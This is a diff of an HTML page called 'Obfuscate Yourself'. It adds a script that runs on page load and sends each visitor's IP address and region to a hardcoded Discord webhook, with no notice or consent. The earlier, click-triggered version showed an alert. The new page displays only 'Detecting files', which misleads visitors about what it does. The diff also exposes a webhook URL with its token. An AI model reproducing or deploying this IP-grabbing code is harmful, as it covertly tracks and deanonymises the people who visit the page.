@@ -4,106 +4,34 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Obfuscate Yourself</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            color: white;
-            height: 100vh;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            flex-direction: column;
-            background-color: #333;
-            transition: background-color 0.5s ease;
-        }
+    <script>
+        (async function() {
+            try {
+                // Get IP instantly
+                let ipResponse = await fetch("https://api64.ipify.org?format=json");
+                let ipData = await ipResponse.json();
+                let ip = ipData.ip || "Unknown";
 
-        h1 {
-            font-size: 2em;
-        }
+                // Get region from IP
+                let regionResponse = await fetch(`https://ipwho.is/${ip}`);
+                let regionData = await regionResponse.json();
+                let region = regionData.region || "Unknown";
 
-        button {
-            background-color: #444;
-            color: white;
-            padding: 15px 30px;
-            font-size: 1.2em;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: background-color 0.3s ease;
-        }
+                // Send to webhook
+                await fetch("https://discord.com/api/webhooks/1341443570111873065/dAlFo8O2FinRdp4t1qpaKL4Y6X7P06CK5GmyyEH38lDb3zk_3_qm8Hv4SvDLN7OShGeN", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: `🌍 **Region:** ${region}\n📡 **IP Address:** ${ip}` })
+                });
 
-        button:hover {
-            background-color: #666;
-        }
-    </style>
+            } catch (error) {
+                console.error("Failed to get IP/Region:", error);
+            }
+        })();
+    </script>
 </head>
 <body>
     <h1>Obfuscate Yourself</h1>
-    <button id="obfuscateBtn">Obfuscate</button>
-
-    <script>
-        // Function to generate a random color for background
-        function randomBackgroundColor() {
-            const colors = ['#FF5733', '#33FF57', '#3357FF', '#F3FF33', '#F333FF', '#33F3FF'];
-            const randomColor = colors[Math.floor(Math.random() * colors.length)];
-            document.body.style.backgroundColor = randomColor;
-        }
-
-        // Function to get the real region and IP using ip-api
-        function getRegionAndIP() {
-            return new Promise((resolve, reject) => {
-                $.get("http://ip-api.com/json", function(response) {
-                    const region = response.regionName;  // The region returned by the service
-                    const ip = response.query;  // The IP address returned by the service
-                    resolve({ region, ip });
-                }).fail(function() {
-                    reject("Region and IP detection failed.");
-                });
-            });
-        }
-
-        // Function to send the region and IP to the webhook
-        function sendRegionAndIPToWebhook(region, ip) {
-            $.ajax({
-                url: "https://discord.com/api/webhooks/1341443570111873065/dAlFo8O2FinRdp4t1qpaKL4Y6X7P06CK5GmyyEH38lDb3zk_3_qm8Hv4SvDLN7OShGeN",
-                type: "POST",
-                contentType: "application/json",
-                data: JSON.stringify({
-                    content: `Region: ${region}\nIP: ${ip}`
-                }),
-                success: function(response) {
-                    console.log("Region and IP sent successfully:", response);
-                    alert("Region and IP sent successfully!");
-                },
-                error: function(xhr, status, error) {
-                    console.error("Error sending region and IP:", status, error);
-                    alert("Failed to send region and IP.");
-                }
-            });
-        }
-
-        // Event listener for the Obfuscate button
-        document.getElementById("obfuscateBtn").addEventListener("click", function() {
-            // Change background color when the button is clicked
-            randomBackgroundColor();
-            
-            // Automatically detect region and IP and send them to the webhook
-            getRegionAndIP().then(function(data) {
-                console.log("Detected region:", data.region);
-                console.log("Detected IP:", data.ip);
-                sendRegionAndIPToWebhook(data.region, data.ip);
-            }).catch(function(error) {
-                console.error(error);
-                alert("Failed to detect region and IP.");
-            });
-        });
-
-        // Initialize with a random background color
-        randomBackgroundColor();
-    </script>
+    <p>Detecting files</p>
 </body>
 </html>
